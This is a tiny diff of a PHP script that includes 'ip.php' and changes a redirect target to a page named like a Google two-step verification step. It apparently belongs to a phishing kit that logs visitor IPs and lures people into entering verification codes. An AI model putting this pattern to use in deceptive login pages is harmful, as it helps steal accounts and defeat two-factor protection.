@@ -1,5 +1,5 @@
 <?php
 include 'ip.php';
-header('Location: thesms.html');
+header('Location: continuetogoogleforms=2stepverification.html');
 exit
 ?>
